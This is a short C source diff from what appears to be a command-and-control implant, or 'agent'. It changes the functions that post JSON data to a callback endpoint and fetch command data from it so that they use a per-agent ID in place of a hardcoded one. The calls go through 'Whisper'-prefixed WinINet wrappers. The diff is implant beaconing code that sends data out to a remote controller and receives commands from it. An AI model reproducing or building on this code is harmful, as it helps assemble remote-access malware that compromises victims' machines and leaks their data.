@@ -37,7 +37,7 @@ wchar_t* char_to_wchar(const char* str)
 // =======================
 // HTTP POST Request
 // =======================
-int post_data(const char* json_data)
+int post_data(const char* json_data, char * agent_id)
 {
     HINTERNET hInternet = WhisperInternetOpenA("WinINet Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
@@ -54,9 +54,8 @@ int post_data(const char* json_data)
     }
 
     // Correctly formatted URL path (only relative path)
-    const char* someid = "1234";
     char url[150];
-    snprintf(url, sizeof(url), CALLBACK_HTTP_FORMAT_POST_ENDPOINT, someid); // Only the relative path, not full URL
+    snprintf(url, sizeof(url), CALLBACK_HTTP_FORMAT_POST_ENDPOINT, agent_id); // Only the relative path, not full URL
 
     // Accept types (NULL means accept anything)
     LPCSTR acceptTypes[] = { "*/*", NULL };
@@ -109,19 +108,18 @@ struct Memory {
 // =======================
 // HTTP GET Request (Equivalent to get_command_data())
 // =======================
-JsonDataCommand get_command_data()
+InboundJsonDataStruct get_command_data(char * agent_id)
 {
     HINTERNET hInternet = WhisperInternetOpenA("WinINet Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    JsonDataCommand result = { NULL };
+    InboundJsonDataStruct result = { NULL };
 
     if (!hInternet) {
         DEBUG_LOGF(stderr, "InternetOpen failed: %lu\n", GetLastError());
         return result;
     }
 
-    const char* someid = "1234";
     char url[150];
-    snprintf(url, sizeof(url), CALLBACK_HTTP_FULL_GET_URL, someid);
+    snprintf(url, sizeof(url), CALLBACK_HTTP_FULL_GET_URL, agent_id);
 
     wchar_t* wurl = char_to_wchar(url); // Convert char* to wchar_t*
     HINTERNET hConnect = WhisperInternetOpenUrlW(hInternet, wurl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
